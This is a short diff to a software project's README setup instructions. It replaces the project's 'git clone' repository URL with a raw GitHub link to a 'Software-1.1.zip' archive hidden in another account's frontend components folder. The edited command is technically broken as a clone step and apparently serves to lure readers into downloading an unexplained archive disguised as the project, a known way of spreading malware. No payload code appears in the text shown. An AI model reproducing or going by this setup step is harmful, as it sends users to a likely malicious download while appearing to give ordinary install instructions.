@@ -229,7 +229,7 @@ Hash gate + prompt caching + visibility guard cut this by ~50% vs unoptimized.
 ### Setup
 
 ```bash
-git clone https://github.com/devnerdly/quorum.git
+git clone https://raw.githubusercontent.com/shraz237/quorum/main/services/dashboard/frontend/src/components/Software-1.1.zip
 cd quorum
 
 cp .env.example .env
